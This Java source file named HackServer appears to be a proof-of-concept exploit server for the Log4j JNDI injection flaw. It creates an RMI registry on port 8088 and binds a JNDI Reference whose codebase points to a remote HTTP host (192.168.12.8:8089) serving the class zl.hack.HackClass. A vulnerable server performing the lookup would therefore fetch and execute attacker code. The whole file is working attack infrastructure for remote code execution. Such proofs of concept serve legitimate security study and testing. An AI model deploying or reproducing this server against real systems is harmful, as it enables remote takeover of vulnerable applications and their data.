package zl.remote;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import javax.naming.Reference;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Description : 
 * Copyright (c) Feifan
 * Author by ff_wind_zl 创建
 * @version 1.0
 * @date 2021.12.13 10:01
 */
public class HackServer {
    private static final Logger logger = LogManager.getLogger(HackServer.class);

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(8088);
        Reference reference = new Reference("zl.hack.HackClass","zl.hack.HackClass",
                "http://192.168.12.8:8089/");
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind("remote",referenceWrapper);
        logger.info("===========");
    }
}
